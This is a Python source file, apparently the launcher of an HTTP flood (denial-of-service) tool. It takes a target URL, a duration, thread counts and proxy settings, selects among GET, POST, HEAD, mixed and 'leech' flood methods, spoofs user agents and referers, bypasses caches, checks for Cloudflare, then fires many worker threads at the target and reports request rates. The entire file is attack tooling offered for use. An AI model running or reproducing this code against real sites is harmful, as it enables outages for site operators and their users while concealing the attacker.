import sys

try:
  import argparse
except Exception as e:
  print('[ERROR] Failed to import argparse, aborting.')
  print(f'\nStacktrace: \n{str(e).strip()}')
  debug = False

if len(sys.argv) <= 1:
  sys.exit('[ERROR] No/Invalid arguments supplied.')
else:
  parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://targetdomain.com', allow_abbrev=False)
  parser.add_argument('-t',   '--target',         dest = 'target',         default = None,     help='Target URL (Example: https://google.com or http://pornhub.com)', type=str)
  parser.add_argument('-p',   '--port',           dest = 'port',           default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
  parser.add_argument('-d',   '--duration',       dest = 'duration',       default = 10,       help='Attack duration', type=int)
  parser.add_argument(        '--proxy',          dest = 'proxy',          default = None,     help='Use a proxy when attacking (Example: 127.0.0.1:1337)', type=str)
  parser.add_argument(        '--proxy-type',     dest = 'proxy_type',     default = 'SOCKS5', help='Set the proxy type (HTTP, SOCKS4 or SOCKS5)', type=str)
  parser.add_argument(        '--proxy-user',     dest = 'proxy_user',     default = None,     help='Proxy username', type=str)
  parser.add_argument(        '--proxy-pass',     dest = 'proxy_pass',     default = None,     help='Proxy password', type=str)
  parser.add_argument(        '--proxy-resolve',  dest = 'proxy_resolve',  default = True,     help='Resolve host using proxy (needed for hidden service targets)', type=str)
  parser.add_argument('-ua',  '--user-agent',     dest = 'useragent',      default = None,     help='User agent to use when attacking, else its dynamic', type=str)
  parser.add_argument('-ref', '--referer',        dest = 'referer',        default = None,     help='Referer to use when attacking, else its dynamic', type=str)
  parser.add_argument('-w',   '--workers',        dest = 'workers',        default = 100,      help='Amount of workers/threads to use when attacking', type=int)
  parser.add_argument('-dbg', '--debug',          dest = 'debug',          default = False,    help='Print info for devs', action='store_true')
  parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',   default = False,    help='Bypass the cache of the site', action='store_true')
  parser.add_argument('-m',   '--method',         dest = 'method',         default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
  parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall',default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
  args = vars(parser.parse_args())

  debug = args['debug']

try:
  from timeit import default_timer as timer
except:
  print('[WARN] Failed to import timeit, debug mode disabled.')
  debug = False

# Import modules
# This is just to test if we have them all
print('[INFO] Importing modules, hold on.')
try:
  if debug: s_start = timer()
  import os
  import threading
  import json
  import time
  import requests
  from colorama import Fore, init; init()
  from random import randint, choice
  from urllib.parse import urlparse
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'{Fore.LIGHTBLACK_EX}[{Fore.WHITE}DEBUG{Fore.LIGHTBLACK_EX}]{Fore.RESET} Importing modules took {str(s_took)} ms.')
  else:
    print(f'{Fore.YELLOW}[{Fore.WHITE}INFO{Fore.YELLOW}]{Fore.RESET} Modules imported.')
except Exception as e:
  print('[ERROR] Failed to import modules, aborting. Please consider "pip install -r requirements.txt"')
  if debug: print(f'\n[DEBUG] Stacktrace: \n{str(e).strip()}')
  exit()

# define some basic colors
fr = Fore.RED
fy = Fore.YELLOW
fw = Fore.WHITE
fg = Fore.GREEN
fg2 = Fore.LIGHTBLACK_EX
frr = Fore.RESET

# Import depencies
print(f'{fy}[{fw}INFO{fy}]{frr} Importing depencies, hold on.')
try:
  if debug: s_start = timer()
  from src.utils import *
  from src.attacks import *
  from src.core import *
  if debug: 
    s_took = "%.2f" % (1000 * (timer() - s_start))
    print(f'{fg2}[{fw}DEBUG{fg2}]{frr} Importing depencies took {str(s_took)} ms.')
  else:
    print(f'{fy}[{fw}INFO{fy}]{frr} Depencies imported.')
except Exception as e:
  print(f'{fr}[{fw}ERROR{fr}]{frr} Failed to import depencies, aborting.')
  if debug: print(f'\n{fg2}[{fw}DEBUG{fg2}]{frr} Stacktrace: \n{str(e).strip()}')
  exit()

method_dict = {
  'GET': http_get, # GET flood
  'POST': http_post, # POST flood
  'HEAD': http_head, # HEAD flood
  'FAST': http_fast, # GET / flood
  'GETHEADPOST': http_ghp, 'GHP': http_ghp, # GET/HEAD/POST flood
  'LEECH': http_leech, # leech attack
  'MIX': http_mix # mixed http attack
}
if args['target'] is None:
  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} No target specified.')

Core.bypass_cache = args['bypass_cache']
Core.proxy = args['proxy']
Core.proxy_type = args['proxy_type']
Core.proxy_user = args['proxy_user']
Core.proxy_pass = args['proxy_pass']
Core.proxy_resolve = args['proxy_resolve']

if not args['method'].upper() in method_dict.keys():
  sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method')

if args['proxy'] != None and args['detect_firewall']:
  yorn = input('Detecting firewalls will leak the host lookup, are you sure you want to continue?').upper()
  if yorn.startswith('N'): args['detect_firewall'] = False
  else: print('Alright, i warned ya!')
  time.sleep(2) # a small timeout if the user reconsiders his choice

init() # initialize console
print_lock = threading.Lock() # creates a "lock" variable

def main():
  print('')
  with open('src/banner.txt', 'r') as fd:
    [print(line.strip('\n')) for line in fd.readlines()]
  
  if isCF(socket.gethostbyname(urlparse(args['target']).netloc)):
    print('\n Target is protected by Cloudflare, attack might not work!\n')
  
  if args['detect_firewall']:
    print(f' Firewall: {fwDetect(args["target"])}')
  
  print(f'\n Target: [{args["target"]}]')
  print(f' Method: [{args["method"]}]')
  print(f' Duration: [{str(args["duration"])}]')
  print(f' Bypass cache: {str(args["bypass_cache"])}')
  print(f' Workers: [{str(args["workers"])}]\n')

  if args['proxy'] != None:
    print(f' Proxy: [{str(args["proxy"])}]')
    print(f' Proxy type: [{str(args["proxy_type"])}]')
    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
    if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
  
  if args['useragent'] is None:
    print(f' User Agents: [{str(len(ualist))}]')
    
  if args['referer'] is None:
    print(f' Referers: [{str(len(reflist)+len(orlist))}]')
  
  print(f' Open Redirect bots: [{str(len(orlist))}]')
  print(f' Keywords: [{str(len(keywords))}]')

def attack():
  session = createsession()
  parsed = urlparse(str(args['target']))
  if args['proxy'] is None: # prevents leaks
    resolved_host = socket.gethostbyname(str(parsed.netloc)) if (not isIPv4(parsed.netloc) and not isIPv6(parsed.netloc) and not parsed.netloc.endswith('.onion')) else parsed.netloc
    if isIPv6(resolved_host): # small IPv6 check
      resolved_host = f'[{resolved_host}]' # adding this allows requests to send data to IPv6 addresses too 
  else: resolved_host = parsed.netloc

  s_start = timer() # timer used for counting avg rps
  for i in range(int(args['workers'])):
    Core.infodict.update({str(i): {'req_sent': 0, 'req_fail': 0, 'req_total':0}})
    kaboom = threading.Thread(target=method_dict[args['method']], args=(str(i), session, f'{parsed.scheme}://{resolved_host}', args['duration'], ))
    kaboom.start()
    Core.threadbox.append(kaboom)
    Core.threadcount += 1
  
  for kaboom in Core.threadbox:
    kaboom.join()
  
  Core.attackrunning = False
  s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
  total_rqs = 0
  for workerkey, workervalue in Core.infodict.items():
    total_rqs += workervalue['req_sent']

  Core.attack_length = s_took
  Core.avg_rps = float(total_rqs)/float(s_took)

if __name__ == '__main__':
  if not debug: clear()
  main()

  input('\nReady? (press enter) ')

  threading.Thread(target=attack).start()
  Core.attackrunning = True
  time.sleep(5)
  clear()

  worker_amount = 20 if args['workers'] > 20 else args['workers']
  s_start = timer()
  while Core.attackrunning:
    try:

      info_dict = calcbestworkers(); i = 0
      for workerkey, workervalue in info_dict.items():
        if i >= 20: continue
        i += 1
      
        req_sent = str(workervalue['req_sent'])
        req_fail = str(workervalue['req_fail'])
        req_total = str(workervalue['req_total'])

        with print_lock:
          print(f'{fy}[{fw}INFO{fy}] [{fw}worker{frr}-{fw}{workerkey}{fy}]{frr} {fg}req_sent{frr}={req_sent} {fr}req_fail{frr}={req_fail} {fy}req_total{frr}={req_total} {fy}thread_count{frr}={str(Core.threadcount)}')
    except KeyboardInterrupt:
      with print_lock: print('Ciao!')
      Core.attackrunning = False
    except Exception: Core.attackrunning = False
    
    # calculate results
    total_req_sent, total_req_fail, total_req = 0,0,0
    for workerkey, workervalue in Core.infodict.items():
      total_req_sent += workervalue['req_sent']
      total_req_fail += workervalue['req_fail']
      total_req += workervalue['req_total']
    
    s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
    attack_length = s_took
    time_left = float(args["duration"]) - float(attack_length)
    if int(time_left) < 0: time_left = 0

    print(f'\n{fy}[{fw}INFO{fy}]{frr} Results: ')
    print(f'   - Requests sent: {str(total_req_sent)}')
    print(f'   - Requests failed: {str(total_req_fail)}')
    print(f'   - Requests total: {str(total_req)}')
    print(f'   - Attack took: {str(attack_length)}')
    print(f'   - Time left: {str(time_left)}')

    time.sleep(2 if args['method'].upper() != 'LEECH' else 10)
    if Core.attackrunning: 
      clear()
  print(f'   - Average requests per second: '+str(Core.avg_rps).replace('.', f'.{fg2}')+frr)